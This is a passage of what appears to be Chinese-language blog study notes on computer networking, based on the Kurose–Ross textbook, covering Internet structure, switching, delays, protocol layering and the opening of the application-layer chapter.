        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>参考资料：<a href="https://cnhuazhu.gitee.io/2021/03/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E8%BF%B0/">花猪のBlog</a></p><p>《计算机网络（自顶向下方法 第7版，James F.Kurose，Keith W.Ross）》</p></blockquote><h1 id="第一章：计算机网络概述"><a href="#第一章：计算机网络概述" class="headerlink" title="第一章：计算机网络概述"></a>第一章：计算机网络概述</h1><p>为了更好的理解<font color=HotPink>Internet（互联网）</font>这个概念，先从简单的<font color=HotPink>网络</font>概念说起：通俗的理解网络，就是由许多<strong>节点</strong>和<strong>边</strong>组成的系统。当我们把这些节点和边具象化之后，计算机网络以及Internet的概念就更容易理解了。</p><h2 id="计算机网络"><a href="#计算机网络" class="headerlink" title="计算机网络"></a>计算机网络</h2><p>通俗的解释计算机网络的概念：<strong>联网的计算机所构成的系统。</strong></p><p>其“节点”分为两类：分别为<strong>主机节点</strong>以及<strong>数据交换节点</strong>。</p><ul><li><p>主机节点： 主机及其上运行的应用程序（是数据的源或目标）。</p><p>  举例：ipad、手机、智能冰箱…</p></li><li><p>数据交换节点： 路由器、交换机等网络交换设备（既不是数据的源也不是目标，而是数据的中转节点）。</p></li></ul><p>其“边”（通信链路）同样分为两类：分别为接入网链路以及主干链路。其作用是将各个节点连接在一起。</p><ul><li>接入网链路：主机连接到互联网的链路。</li><li>主干链路：路由器之间的链路。</li></ul><p>仅仅依靠所谓的“节点”和“边”是无法进行互联网间的通信的，还有一个要素就是协议。</p><ul><li>协议（protocol）：定义了在两个或多个通信实体之间交换的报文的格式和顺序，以及报文发送和&#x2F;或接收一条报文或其他事件所采取的动作。</li></ul><p>Internet 中所有的通信行为都受协议制约。</p><p>至此我们可以大致理解计算机网络的概念。</p><h2 id="Internet（互联网）"><a href="#Internet（互联网）" class="headerlink" title="Internet（互联网）"></a>Internet（互联网）</h2><p>以TCP&#x2F;IP协议为主的一簇协议，由该协议支撑起的计算机网络。</p><p>我们可以从两方面理解到底何为Internet：一个方面是从Internet的具体构成角度（即上文所提），另一方面是从服务的角度来理解。</p><h3 id="从具体构成的角度"><a href="#从具体构成的角度" class="headerlink" title="从具体构成的角度"></a>从具体构成的角度</h3><ul><li><p>数以亿计的、互联的计算设备，具体包括：</p><p>  主机（host）&#x3D; 端系统（end system）</p><p>  在操作系统中驻留的网络应用程序</p></li><li><p>通信链路</p><p>  举例：光纤、同轴电缆、无线电、卫星</p><p>  传输速率 &#x3D; 带宽（bps）</p></li></ul><blockquote><pre><code>  注意区分：      存储常用字节Byte：K/M/G层级为2^10进制      传输常用比特Bit：K/M/G层级为10^3进制</code></pre></blockquote><ul><li><p>分组交换设备：转发分组（packets）。</p><p>  举例：路由器、交换机…</p></li><li><p>协议：控制发送、接收消息。</p><p>  举例：TCP、IP、HTTP、FTP、PPP…</p></li><li><p>Internet标准：</p><p>  RFC（Request for comments）：请求评述</p><p>  IETF（Internet Engineering Task Force）：互联网工程任务组</p></li><li><p>Internet即“网络的网络”</p></li></ul><blockquote><pre><code>  理解：     很多网络通过网络互联设备连接在一起     网络之下还包括很多小网络     小网络之间也可以任意互联</code></pre></blockquote><h3 id="从服务的角度"><a href="#从服务的角度" class="headerlink" title="从服务的角度"></a>从服务的角度</h3><p><strong>分布式的应用进程</strong>以及为分布式应用进程提供通讯服务的<strong>基础设施</strong>。</p><blockquote><p>基础设施：包括主机以及应用层以下的所有协议实体。</p></blockquote><ul><li><p>使用通信设施进行通信的分布式应用</p><p>  举例：Web、VoIP、email、分布式游戏、电子商务、社交网络…</p></li><li><p>通信基础设施为apps提供编程接口（通信服务）：将发送和接收数据的apps与互联网连接起来。</p></li></ul><blockquote><pre><code>   通信服务分为两种：       面向连接的服务：以TCP/IP协议向应用进程提供服务的形式。       无连接的服务：以UDP协议向应用进程提供服务的形式。</code></pre></blockquote><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><p>网络结构主要由三个部分组成：网络边缘（Edge）、网络核心（Core）、接入网（Acess）\物理媒体</p><ul><li>网络边缘：包括应用进程（程序）以及为其提供硬件基础服务的主机。边缘上运行的网络应用是网络存在理由。</li><li>网络核心：包括网络交换节点（路由）以及节点间的通信链路。边缘主机只有通过接入网连接到网络核心才可以实现相互间的信息传递。</li><li>接入网：有线或无线的通信链路。其作用是将边缘的主机系统接入到网络核心中去。</li></ul><h3 id="网络边缘"><a href="#网络边缘" class="headerlink" title="网络边缘"></a>网络边缘</h3><p>网络边缘就是端系统（主机），包括网络应用（如：Web、Email）和支持网络应用的硬件设备。应用进程可以说是整个网络系统存在的理由，其中不同边缘的应用进程通过网络进行数据交换。</p><p>应用进程间的通讯模式有两种：</p><ol><li>C&#x2F;S模式（客户端&#x2F;服务器）：有着明确的客户端以及服务器。其特点也是该模式比较致命的问题：扩展性差。一个服务器的请求载荷是有限的，随着客户端的请求载荷增加，服务器的压力会越来越大，处理能力就会逐渐下降。一旦请求载荷超过某一个阈值时，服务器的处理能力就会出现断崖式下跌。目前的解决方式就是增加服务器的部署。</li><li>P2P模式（peer-peer）：没有明确的客户端或者服务器的界限。每一个分布式的应用进程既可以是客户端，又可以是服务器。这样的模式可以很好地解决C&#x2F;S模式中扩展性差的问题，因为随着请求服务的节点增加，从某种意义上来说提供服务的节点也在相应地增加。（实例：迅雷、BitTorrenth）</li></ol><p>基础设施为网络应用提供的服务有两种方式：</p><blockquote><pre><code>   理解基础设施的概念：在网络应用（应用进程）下层的所有内容，包括主机、接入网、网络核心等，都统一理解为基础设施。   两种服务方式的目的都是在端系统之间传输数据。</code></pre></blockquote><h4 id="面向连接的通信方式："><a href="#面向连接的通信方式：" class="headerlink" title="面向连接的通信方式："></a>面向连接的通信方式：</h4><pre><code>代表：TCP服务（Transmission Control Protocol，传输控制协议）有握手：目的是两个通信主机间为连接建立状态，有一个数据传输前的准备的过程。</code></pre><p>特性：</p><ul><li>可靠地、按顺序地传送数据：不同端系统间的通信归根到底都是数据通过底层的物理信道进行传输，如何保证物理信息在传输时准确，TCP服务给予保证。</li><li>流量控制：在信息传输时存在这样一种情况，即服务器的能力很强，可以高速地发送大量数据，但是信息接收方（客户端）接收、处理信息的能力很弱，二者的速度不匹配，信息传输就容易造成错误。TCP协议实体可以发送反馈，从而协调好发送方和接收方的速度，致使发送方不会淹没接收方。</li><li>拥塞控制：信息传输时还有一种情况：信息发送和接收双方的能力都很强，但是网络核心中的传输信道发生拥塞，如果此时发送方仍然不断地向外大量发送数据，很可能造成数据的丢失。TCP协议就可以根据情况判断，当网络拥塞时，控制发送方降低信息发送速率。</li></ul><p>使用TCP的应用： HTTP (Web)、FTP (文件传送)、Telnet (远程登录)、SMTP（email）</p><h4 id="无连接服务："><a href="#无连接服务：" class="headerlink" title="无连接服务："></a>无连接服务：</h4><pre><code>代表：UDP服务（User Datagram Protocol，用户数据报协议）无握手：直接传输数据，没有传输前的准备过程。</code></pre><p>特性：</p><ul><li><pre><code>   数据传输不可靠</code></pre></li><li><pre><code>   无流量控制</code></pre></li><li><pre><code>   无拥塞控制</code></pre></li></ul><p>UDP服务不能保证信息传输的准确性，但是它的存在也具有价值。一些实时流媒体应用对于数据传输的延迟是无法接受的，UDP服务正是省去了信息传输的很多步骤从而保证了信息传输的速度。</p><p>使用UDP的应用：流媒体、远程会议、DNS、Internet电话</p><h3 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h3><p>网络核心由数据交换节点和其间的通信链路组成。</p><p>网络核心的主要功能是：</p><ul><li>路由：决定分组采用的源主机到目标主机的路径（全局）</li><li>转发：将分组从路由器的输入链路转移到输出链路（局部）</li></ul><p>通信网络大致可以按照如下方式分类：</p><ol><li>电路交换网络</li></ol><p>端到端的资源被分配给从源端到目标端的呼叫（建立起一条专有链路）。</p><p>电路交换网络的特点是<strong>资源独享</strong>，即便主机间建立连接后无数据传输，也会占用线路资源，从而使其他用户无法使用，导致资源浪费。但是这种连接方式保证了性能，多用于传统电话网络，而<strong>不适用计算机间的连接</strong>。</p><blockquote><p>  计算机之间的通信不像电话，它具有很强的突发性，两台主机建立连接后并不是时时刻刻都在进行数据传输。（如浏览网页，用户发起请求之后的很长一部分时间都在进行页面浏览，此时并没有数据传输）</p></blockquote><p>为了提高电路交换网络的使用效率，网络资源（如带宽）被分成“片段”，同时被多位用户使用。像这样分成片段的方式主要有：</p><ul><li>频分（Frequency-division multiplexing）</li><li>时分（Time-division multiplexing）</li><li>波分（Wave-division multiplexing）</li></ul><p><strong>频分（FDM）</strong>：将带宽分成几个片段，不同的用户使用不同的片段。</p><p><strong>时分（TDM）</strong>：将带宽按周期分为成许多片段，每一个周期再分为几个不同的时隙（slot），每位用户固定使用其中的一个时隙。</p><p><strong>波分（WDM）</strong>：多用于光电路传输，把光信号分成不同波段，分给不同用户使用。</p><ol start="2"><li>分组交换网络</li></ol><p>将要传输的数据分成一个个的单位：分组&#x2F;包（packet）</p><p>与电路交换网络不同，采用分组交换网路通信时，数据传输会占用通信链路的全部带宽。</p><p>主机间的数据传输过程如图：转发节点接收前一个节点传来的分组，并存储起来，等分组的全部传输完成之后，再将数据传输给下一个节点。（存储-转发）</p><blockquote><p>   需要注意的是：每一个节点都必须接收分组的全部之后才能向后传递。如果边接收分组，边向后传输，就会造成多段通信链路全部处于占用状态，致使其他用户无法使用。分组也就失去了意义。</p></blockquote><blockquote><p>   例子：如图，长度为L &#x3D; 7.5Mbits的分组，在一个速率为R &#x3D; 1.5Mbps的链路中传输，三次存储-转发的延时为3 × (7.5 &#x2F; 1.5)s &#x3D; 15s.</p></blockquote><p>分组交换网络的<strong>优势</strong>就是：按需使用。即有需要时才占用网络资源。</p><p>但是这较于电路交换网络的延迟会高很多，延迟的具体组成分为两部分：</p><ul><li>节点对分组进行存储</li><li>排队时间</li></ul><blockquote><p>   分组交换的排队延迟和丢失：</p><p>   当转发节点的<strong>数据到达速率&gt;链路的输出速率</strong>时，分组将会进行排队，如果路由器的缓存用尽，分组将会丢失。</p><p>   为了保证数据可靠地传输，就需要协议来约束：拥塞控制</p></blockquote><p>了解了分组交换网络的数据传输原理，就可以引出<strong>统计时分多路复用（statistical time division multiplexing，STDM）</strong>：</p><p>这个概念很像时分多路复用（TDM），区别在于：由于每个分组的传输时间不同，因此对于带宽无绝对的时间划分方式（每个时隙是不同的）。</p><p><strong>同样的网络资源，分组交换网络较电路交换网络允许更多的用户使用</strong>。</p><h4 id="存储-转发"><a href="#存储-转发" class="headerlink" title="存储-转发"></a>存储-转发</h4><p>分组的存储转发一段一段从源端到目标端，按照有无网络层的连接可分为两种：</p><ul><li>数据报（datagram）网络</li><li>虚电路（virtual circuit）网络</li></ul><p>数据报网络：</p><ul><li>在通信之前无需建立连接，一有数据就传输。</li><li>每一个分组都独立路由（路径不一样，可能会失序）。</li><li>源主机发送给目标主机的分组，携带了目标主机的完整地址，路由器根据分组的目标地址进行路由。</li><li>路由器不会维护主机间的通讯状态。</li></ul><p>虚电路网络：</p><ul><li>在通信之前，主机间需要先通过信令建立连接，分组传输路径保持不变。</li><li>每个分组都带标签（虚电路标识VCID），标签决定了下一个跳转。</li><li>路由器会维持每个呼叫的状态信息。</li></ul><h2 id="接入网和物理媒体"><a href="#接入网和物理媒体" class="headerlink" title="接入网和物理媒体"></a>接入网和物理媒体</h2><p>将端系统和边缘路由器连接的方式可以分为三类：住宅接入网络；单位接入网络（学校、公司）；无线接入网络。</p><pre><code>注意接入网络的带宽分为：共享；专用。（比如：有一个接入住宅大楼的网络是专用的，分发到每个住户的网络是共享这一接入网的。）</code></pre><h3 id="接入网"><a href="#接入网" class="headerlink" title="接入网"></a>接入网</h3><ol><li>住宅接入：</li></ol><ul><li><p>调制解调器（moden）：将上网数据调制加载音频信号上，在电话线上传输，在局端将其中的数据解调出来，接入网络核心；反之亦然。</p><p>  拨号调制解调器：56kbps的速率直接接入路由器（通常更低）。不能同时上网和打电话。</p></li><li><p>DSL（digital subscriber line）：采用现存的到交换局DSLAM的电话线。</p><pre><code>  依然采用调制解调的方式  带宽其中0k~4k的部分用于传播语音，其他的部分分为上行和下行数据传输（通常下行速度更大，称为ADSL（非对称））  DSL线路上的数据被传到互联网  DSL线路上的语音被传到电话网  小于2.5Mbps上行传输速率（typically &lt; 1 Mbps）  小于24Mbps下行传输速率（typically &lt; 10 Mbps）</code></pre></li><li><p>线缆网络：有线电视信号线缆双向改造。（利用电视线传输）</p><pre><code>  带宽其中一部分用于传播电视信号，其他的部分分为上行和下行数据传输。  FDM：在不同频段传输不同信道的数据，数字电视和上网数据（上、下行）。  HFC（hybrid fiber coax，混合光纤同轴网）：光纤传输系统与同轴电缆分配网相结合。（非对称：最高30Mbps下行传输速率，2Mbps上行传输速率）  线缆和光纤网络：将各个家庭用户接入到ISP路由器。  各用户共享到线缆头端的接入网络。（注意与DSL不同，DSL中每个用户都有一个专用的线路到CO（central office））</code></pre></li><li><p>电缆模式</p></li><li><p>家庭网络</p></li></ul><ol start="2"><li><p>企业接入网络：</p><p> 经常被企业或者大学等机构采用（10Mbps、100Mbps、1Gbps、10Gbps传输率。现在，端系统经常直接接到以太网络交换机上）</p></li><li><p>无线接入网络：</p><p> 各无线端系统共享无线接入网络（端系统到无线路由器）</p><pre><code> 无线LANs（建筑物内部） 广域无线接入</code></pre></li></ol><h3 id="物理媒体"><a href="#物理媒体" class="headerlink" title="物理媒体"></a>物理媒体</h3><blockquote><p>   几个概念：</p><pre><code>  bit：在发送-接受对间传播  物理链路：连接每个发送-接受对之间的物理媒体  导引型媒体（看得见、摸得着）：信号沿着固体媒介被引导。（eg：同轴电缆、光纤、双绞线）  非导引型媒体（看不见）：开放的空间传输电磁波或者光 信号，在电磁或者光信号中承 载数字数据。</code></pre></blockquote><p>双绞线、同轴电缆、光纤（导引型媒体）<br>无线链路（非导引型媒体）</p><h2 id="Internet结构和ISP"><a href="#Internet结构和ISP" class="headerlink" title="Internet结构和ISP"></a>Internet结构和ISP</h2><p>ISP：Internet Service Provider</p><p>任何一个端系统都是通过接入ISP接入网络，因此就会有很多ISP。由于网络用户数量非常之多，因此也会有许多ISP，ISP必须是互联的，只有这样端系统之间才可以通信。那么ISP之间是如何互联的？</p><p>有一种办法是将他们<strong>两两互联</strong>，但是这会存在一个问题：ISP数量非常之多，在数量达到一定的情况下，再增添一个ISP所耗费的成本会非常巨大，整个体系的性能也会下降。因此这个方法并不可行，我们称其为：<strong>不可扩展</strong>。</p><p>当意识到这点之后，人们就会想到利用一个<font color=HotPink>global ISP</font>作为“桥梁”，来将各个接入ISP连接起来。</p><p>一个global ISP可以完成“桥梁”的工作，很明显这种做法一定是有利可图的，所以为了不让其出现垄断的局面（垄断总是不好的），所以这时一定会有其他的ISP来参与竞争（如图：部分接入网连接ISP A，部分连入ISP B…）。</p><p>有竞争必然也有合作，运营商们可以互相商量，给彼此提供一个接口，这样所有的客户端就都可以相互通信。</p><blockquote><p>   ISP之间连接方式有两种：</p></blockquote><blockquote><pre><code>   直接连接（peering link）   通过IXP（Internet exchange point，网络交换点）来连接</code></pre></blockquote><p>接下来该种通信业务就会细分，出现所谓的区域性网络，他们可以更加方便地为某一地区提供通信服务，同时将与之接入的边缘ISP接入到全局的ISP。</p><p>然后内容提供商网络（Internet Content Providers，ICP，例：Google，Microsoft），可能会构建他们自己的网络，将它们的服务、内容更 加靠近端用户，向用户提供更好的服务,减少自己的运营支出。</p><p>至此，整个网络体系就构成了当今的局面，即网络的网络。</p><h3 id="Internet结构"><a href="#Internet结构" class="headerlink" title="Internet结构"></a>Internet结构</h3><p>是一个具有层次的结构：</p><ol><li>第一层ISP（中心）：国家&#x2F;国际覆盖，速率极高。（如UUNet, BBN&#x2F;Genuity, Sprint, AT&amp;T）</li></ol><ul><li>直接与其他第一层ISP相连</li><li>与大量的第二层ISP和其他客户网络相连</li><li>通过Peer或IXP连接</li></ul><ol start="2"><li>第二层ISP：更小些的 (通常是区域性的) ISP。</li></ol><ul><li><pre><code>   与一个或多个第一层ISPs连接，也可能与其他第二层ISP相连。</code></pre></li><li><pre><code>   通过Peer或IXP连接</code></pre></li></ul><ol start="3"><li>第三层ISP与其他本地ISP： 接入网 (与端系统最近)</li></ol><h2 id="分组延时、丢失和吞吐量"><a href="#分组延时、丢失和吞吐量" class="headerlink" title="分组延时、丢失和吞吐量"></a>分组延时、丢失和吞吐量</h2><p>分组丢失和延时发生的原因：分组在传输过程中，会在路由器的缓冲区形成分组队列，分组等待排到队头，就会被传输至下一节点。这一排队过程就会产生排队延时（还有其他的延时，后面会详细提到）。如果缓冲区容纳不下被传输来的分组（队列容量不够），就会发生分组丢失的现象。</p><h3 id="分组延时"><a href="#分组延时" class="headerlink" title="分组延时"></a>分组延时</h3><ol><li>节点处理延时（nodal processing delay）：节点在收到分组时，为处理分组所花费的时间。</li></ol><ul><li><pre><code>   检查bit级差错</code></pre></li><li><pre><code>   检查分组首部和决定将分组导向何处</code></pre></li><li><pre><code>   微秒级</code></pre></li></ul><ol start="2"><li>排队延时（queuing delay）：分组在节点中排队等待被发送所花费的时间。</li></ol><ul><li><pre><code>   时间长短依赖于路由的拥塞程度（是不确定的）</code></pre></li><li><pre><code>   毫秒-微秒级</code></pre></li></ul><ol start="3"><li>传输延时（transmission delay）：数据从节点进入到传输媒体所耗费的时间。</li></ol><ul><li><pre><code>   R = 链路带宽（bps）</code></pre></li><li><pre><code>   L = 分组长度（bits）</code></pre></li><li><pre><code>   将分组发送到链路上的时间：T = L/R</code></pre></li></ul><ol start="4"><li>传播延时（propagation delay）：数据（电磁波）在物理信道上传输一定距离所耗费的时间。</li></ol><ul><li><pre><code>   d = 物理链路的长度</code></pre></li><li><pre><code>   s = 数据信号在介质上传播的速度（约为2×108 m/sec）</code></pre></li><li><pre><code>   传播延时：T = d/s</code></pre></li></ul><p>下面以车队的例子来类比：</p><p>延时小结：</p><p>排队延时取决于流量强度：</p><blockquote><pre><code>   R = 链路带宽 (bps)   L = 分组长度 (bits)   a = 分组到达队列的平均速率</code></pre></blockquote><p>流量强度 &#x3D; La&#x2F;R</p><blockquote><pre><code>   La/R ~ 0: 平均排队延时很小   La/R -&gt; 1: 延时变得很大   La/R &gt; 1: 比特到达队列的速率超过了从该队列输出的速率，平均排队延时将趋向无穷大！   注意：设计系统时流量强度不能大于1，会导致分组丢失！</code></pre></blockquote><p>Traceroute 诊断程序: 提供从源端，经过路 由器，到目的的延时测量。</p><ul><li><p>沿着目的的路径，向每个路由器发送3个探测分组</p></li><li><p>路由器 i 将向发送方返回一个分组</p></li><li><p>发送方对发送和回复之间间隔计时</p></li></ul><blockquote><pre><code>   Traceroute具体实现原理：   利用了ICMP（Internet Control Message Protocol，互联网控制报文协议）。这种协议下的报文数据IP头部有一个字段：TTL（Time to Live，生存时间）字段。这个字段在最初传输时会被赋值，每经过一个路由器时，TTL减1。当TTL在某一个路由器降为零时，该分组会被抛掉，并会向源主机发送一个ICMP报文——通知源主机：分组发送到该路由时被“干掉”了（并附带IP地址），所以实现每一跳的查询方式就是设置不同的TTL。当分组到达目标主机时，肯定会占用一个端口，但是在目标主机中该端口并没有进程在跑，于是目标主机就会向源主机发送另一种ICMP报文——通知源主机：分组在我这边由于目标端口不可达，“挂掉了”（并附带IP地址）。这就是具体的工作原理。</code></pre></blockquote><pre><code>例子：    上图在第7步和第8步延时出现了陡增的情况，很有可能是跨洋链路（该段链路特别长）</code></pre><h3 id="吞吐量（Throughput）"><a href="#吞吐量（Throughput）" class="headerlink" title="吞吐量（Throughput）"></a>吞吐量（Throughput）</h3><p>在源端和目标端之间传输的速率（数 据量&#x2F;单位时间）</p><ul><li><p>瞬间吞吐量: 在一个时间点的速率</p></li><li><p>平均吞吐量: 在一个长时间内平均值</p></li></ul><blockquote><pre><code>   瓶颈链路：端到端路径上，限制端到端吞吐的链路。（短板效应）   主机A到主机B之间的通信链路一定是公用的，我们假设有10个用户在用同一段链路（该链路带宽最小），那么A到B的连接就会占用这最小链路带宽的十分之一。这十分之一带宽就是A到B的瓶颈带宽，是它限制了A到B的吞吐量。</code></pre></blockquote><h2 id="协议层次及服务模型"><a href="#协议层次及服务模型" class="headerlink" title="协议层次及服务模型"></a>协议层次及服务模型</h2><p>网络是一个复杂的系统。一般对于实现复杂的组织与功能的思路就是分模块，把不同的小功能分模块实现，然后总体实现一个复杂庞大的功能。计算机网络功能的实现同样利用这个思路，利用层次化方式实现复杂的网络功能。</p><blockquote><p>   层次化的具体思路：</p><ul><li>将网络复杂的功能分层功能明确的层次，每一层实现了其中一个或一组功能，功能中有其上层可以使用的功能：服务</li><li>本层协议实体相互交互执行本层的协议动作，目的是实现本层功能， 通过接口为上层提供更好的服务</li><li>在实现本层协议的时候，直接利用了下层所提供的服务</li><li>本层的服务：借助下层服务实现的本层协议实体之间交互带来的新功能（上层可以利用的）+ 更下层所提供的服务</li></ul><p>   服务（Service）：低层实体向上层实体提供它们之间的 通信的能力，是通过原语(primitive)来操作的，是垂直关系。</p><p>   协议（protocol）：对等层实体(peer entity)之间在相互通信的过程中，需要遵循的规则的集合，是水平关系。</p><p>   协议和服务的关系：协议需要下层提供的服务才能实现，协议实现的目的是为了向上层提供更好的服务。本层的服务用户只能看见服务而无法看见下面的协议，下面的协议对上面的服务用户是透明的（看不见的）。</p></blockquote><p>一些术语介绍：</p><ul><li><p>实体（entity）：表示任何可发送或接收信息的硬件或软件进程。</p></li><li><p>服务（Service）：低层实体向上层实体提供它们之间的通信的能力。</p></li><li><p>服务访问点 SAP (Services Access Point) ：上层使用下层提供的服务通过层间的接口。</p></li><li><p>原语（primitive）：上层使用下层服务的形式，高层使用低层提供的服务，以及低层向高层提供服务都是通过服务访问原语来进行交互的。</p></li></ul><blockquote><p>一个服务提供者（service provider）可能会向上层用户（service user ）提供不同的服务，提供服务的具体接口就是层间的服务访问点（SAP），服务的具体形式就是原语。</p></blockquote><p>服务的类型：</p><ol><li>面向连接的服务（Connection-oriented Service）：<ul><li>连接(Connection)：两个通信实体为进行通信而建立的一 种结合。</li><li>面向连接的服务通信的过程：建立连接，通信，拆除连接。</li><li>适用范围：对于大的数据块要传输; 不适合小的零星报文。</li><li>特点：保序（也不尽然）。</li></ul></li><li>无连接的服务（Connectionless Service）：两个对等层实体在通信前不需要建 立一个连接，不预留资源；不需要通信双方都是 活跃。<ul><li>特点：不可靠、可能重复、可能失序。</li><li>适用范围：适合传送零星数据。</li></ul></li></ol><p>分层处理和实现复杂系统的好处：</p><ul><li><p>概念化：结构清晰，便于标示网络组件，以及描述其相互关系。（分层参考模型）</p></li><li><p>结构化：模块化更易于维护和系统升级。（改变某一层服务的实现不影响系统中的其他层次）</p></li></ul><blockquote><p>分层也具有有害的地方：分层实现一个功能时，需要不同层次时时交换信息数据，那么整体的效率就会降低。（每一层都要做差错检测）</p></blockquote><p>层具有的功能：</p><ul><li>差错控制（error control）：使得两个对等体（不同端系统中相同的层次）之间的逻辑通信更加可靠。</li><li>流量控制（flow control）：防止发送方淹没接收方。</li><li>分段与重组（segmentation and reassembly）：在发送端将大数据块分割成小数据块，在接收端将小数据块重新组合成原来的大数据块。</li><li>多路复用（multiplexing）：允许多个上层会话共享一个下层连接。</li><li>连接建立（connection setup）：握手。</li></ul><h3 id="Internet协议栈"><a href="#Internet协议栈" class="headerlink" title="Internet协议栈"></a>Internet协议栈</h3><p>从上至下层次划分为：</p><ul><li>应用层（application）：完成应用报文之间的交互。（实现各种网络应用）</li></ul><pre><code>数据单元：**报文（message）**eg：FTP、SMTP、HTTP</code></pre><ul><li>传输层（transport）：实现进程到进程之间的数据传输。</li></ul><pre><code>数据单元：**报文段（segment）**eg：TCP、UDP</code></pre><ul><li>网络层（network）：实现端到端（源主机-目标主机）的以分组为单位的数据传输。</li></ul><pre><code>数据单元：**分组（packet）**；如果是无连接的方式：**数据报（datagram）**eg：IP、routing protocols（路由协议）</code></pre><ul><li>链路层（link）：在相邻网络节点间以帧为单位传输数据。</li></ul><pre><code>数据单元：**帧（frame）**eg：PPP（点对对协议）、802.11(wifi)、Ethernet</code></pre><ul><li>物理层（physical）：在线路上传送bit。（把数字数据转换成物理信号，使其承载于媒体之上）</li></ul><pre><code>数据单元：**位（bit）**    Internet实际上只定义了上三层协议（应用层、传输层、网络层），下面的链路层和物理层被统一为网络接口层。    协议栈不同层中的协议并未实现全覆盖，有些应用可以直接跨层，由更低层的协议实现。</code></pre><p>OSI参考模型</p><p>从上至下层次划分为：</p><ul><li><p>应用层（application）</p></li><li><p>表示层（presentation）：允许应用解释传输的数据。（关心交换数据的格式）</p><p>   表示层的目的是表示出用户看得懂的数据格式,实现与数据表示有关的功能。主要完成数据字符集的转换、数据格式化和文本压缩、数据加密、解密等工作。</p></li><li><p>会话层（session）：数据交换的同步，检查点，恢复。</p></li><li><p>传输层（transport）</p></li><li><p>网络层（network）</p></li><li><p>链路层（data link）</p></li><li><p>物理层（physical）</p><p>   表示层与会话层的功能在TCP&#x2F;IP协议栈中由应用层完成。</p><p>   OSI参考模型包括了体系结构、服务定义和协议规范三级抽象。</p></li></ul><h3 id="封装与解封装"><a href="#封装与解封装" class="headerlink" title="封装与解封装"></a>封装与解封装</h3><p>源主机向目标主机传送报文的真正流程——不断地封装与解封：</p><p>上层报文的传输需要借助层间接口，依托于下层的服务，在不同层加入相应的控制信息，形成本层的数据单元，继续向下传递，直到物理层将每一个bit传送给通信链路（这是封装的过程）。通过链路交换机，底部物理层会还原数据形成链路层的数据单元（帧），链路层查询帧头部的目标MAC地址，并查询该交换机的栈表（或交换表），并决定将帧从哪一个端口放出，接着就交给该端口的网卡，转换成对应物理层的bit，将其释放到通信链路中。通过路由器，先向上传递形成帧，再将帧转换为网络层的数据单元（分组），网络层从分组获取目标的IP信息，并查询网络层的转发表，决定将数据从哪一个网口释放出去，再形成对应的帧向下传递，进而转为bit由物理层将其传输到通信链路。就这样数据不断传输，最后到达目标主机，并不断解封装形成应用层的报文。</p><h1 id="第二章：计算机网络-应用层"><a href="#第二章：计算机网络-应用层" class="headerlink" title="第二章：计算机网络|应用层"></a>第二章：计算机网络|应用层</h1><blockquote><p>互联网层次中，应用层的协议是最多的。</p></blockquote><p>网络应用的原理：网络应用协议的概念和实现方面</p><ul><li>运输层的服务模型（transport-layer service models）</li><li>客户&#x2F;服务器模式（client-server paradigm）</li><li>P2P模式（peer-to-peer paradigm）</li></ul><p>网络应用的实例：互联网流行的应用层协议</p><ul><li>HTTP</li><li>FTP</li><li>SMTP &#x2F; POP3 &#x2F; IMAP</li><li>DNS</li></ul><p>编程：网络应用程序创建:</p><ul><li>socket API &#x2F; E-mail &#x2F; web &#x2F; instant messaging: (QQ), Wechat (即时消息) &#x2F; remote login (远程登录) &#x2F; P2P file sharing (文件共享) &#x2F; multi-user network games (多用户网络游戏) &#x2F; streaming stored video clips (流式存储视频) &#x2F; Social networks (社交网络) &#x2F; voice over IP (IP电话) &#x2F; real-time video conferencing (实时视频会议) &#x2F; grid computing&#x2F;Cloud computing (网格计算&#x2F;云计算)</li></ul><p>创建一个新的网络应用：</p><ul><li><p>编程：</p><ul><li>在不同的端系统上运行（run on different end systems）</li><li>通过网络基础设施提供的服务，应用进程彼此通信（communicate over network）</li><li>例如：Web服务器软件与浏览器软件通信（web server software communicates with browser software）</li></ul></li><li><p>无需为网络核心设备编写程序（no need to write software for networkcore devices）：</p><ul><li>网络核心不会运行用户应用（network core devices do not run user applications）</li><li>网络应用只在端系统上存在 ，快速网络应用开发和部署（applications on end systems allows for rapid app development, propagation）</li></ul></li></ul><h2 id="应用层协议原理（Principles-of-network-applications）"><a href="#应用层协议原理（Principles-of-network-applications）" class="headerlink" title="应用层协议原理（Principles of network applications）"></a>应用层协议原理（Principles of network applications）</h2><p>可能的应用架构：</p><ul><li><p>客户-服务器模式（C&#x2F;S:client&#x2F;server）</p></li><li><p>对等模式（P2P:Peer To Peer）</p></li><li><p>混合体：客户-服务器和对等体系结构</p></li></ul><blockquote><p>  浏览器&#x2F;服务器模式（B&#x2F;S：Brower&#x2F;Server）是C&#x2F;S架构的一种特例</p></blockquote><h3 id="客户-服务器（C-x2F-S）体系结构"><a href="#客户-服务器（C-x2F-S）体系结构" class="headerlink" title="客户-服务器（C&#x2F;S）体系结构"></a>客户-服务器（C&#x2F;S）体系结构</h3><p>服务器：</p><ul><li>一直在运行</li><li>固定的IP地址和周知的端口号（约定）</li><li>服务器是数据中心（包括软件资源，硬件资源，数据资源）</li><li>扩展性差（性能在访问数量达到一定程度时会出现断崖式下跌）</li></ul><p>客户端：</p><ul><li>主动与服务器连接（服务器先运行，客户端后访问）</li><li>与互联网有间歇性的连接</li><li>可能是动态IP地址</li><li>不直接与其他客户端通信</li></ul><h3 id="对等体（P2P）体系结构"><a href="#对等体（P2P）体系结构" class="headerlink" title="对等体（P2P）体系结构"></a>对等体（P2P）体系结构</h3><ul><li><p>（几乎）没有一直运行的服务器</p></li><li><p>任意端系统之间可以进行通信</p></li><li><p>每一个节点既是客户端又是服务器</p><p>   自扩展性：新peer节点带来新的服务能力，当然也带来新的服务请求</p></li><li><p>参与的主机间歇性连接且可以改变IP地址</p><p>   带来的问题就是：难以管理</p></li><li><p>实例：迅雷</p></li></ul><h3 id="C-x2F-S和P2P体系结构的混合体"><a href="#C-x2F-S和P2P体系结构的混合体" class="headerlink" 